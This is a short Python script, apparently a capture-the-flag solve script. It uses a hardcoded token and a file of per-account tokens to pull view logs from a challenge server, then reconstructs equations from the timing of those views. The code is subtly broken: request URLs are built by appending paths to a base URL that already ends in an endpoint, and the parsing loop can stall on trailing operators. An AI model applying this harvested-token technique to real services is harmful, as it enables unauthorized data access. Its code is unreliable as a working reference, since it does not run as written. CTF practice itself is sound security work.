# Constructs equations from exfiltrated data from view logs

import requests
import json
from datetime import datetime, timezone

start = datetime.now(timezone.utc)

TOKEN = "05fe637bf06f331ba5088b1c1a7d2763db072dce875f018a05bdfd49d7fa3cdba4682859c9fab7fc8ad6"
BASE = "http://chals.tisc25.ctf.sg:23196/api/vault/check"

resp = requests.post(f"{BASE}/vault/check", headers={"Authorization": TOKEN})
print(resp.status_code)

with open("accounts.json", "r") as f:
    accounts = json.load(f)
results = []

for key, account in accounts.items():
    username = account["username"]
    token = account["token"]

    r = requests.get(f"{BASE}/api/views", headers={"Authorization": token})
    data = r.json() or {}
    views = data["views"]
    for view in views:
        ts = view["timestamp"]
        if not ts:
            continue
        ts = datetime.fromisoformat(ts.replace("Z", "+00:00"))
        if ts > start:
            results.append((key, ts))

results.sort(key=lambda x: x[1])
print(results)
eqns = []
i = 0
while i < len(results):
    l = results[i][0]

    if i + 1 < len(results):
        op = results[i + 1][0]
        if op in ["+", "-", "*", "/"]:
            if i + 2 < len(results):
                r = results[i + 2][0]
                eqns.append((l, op, r))
                i += 3
        else:
            eqns.append((l, "?", op))
            i += 2
print(eqns)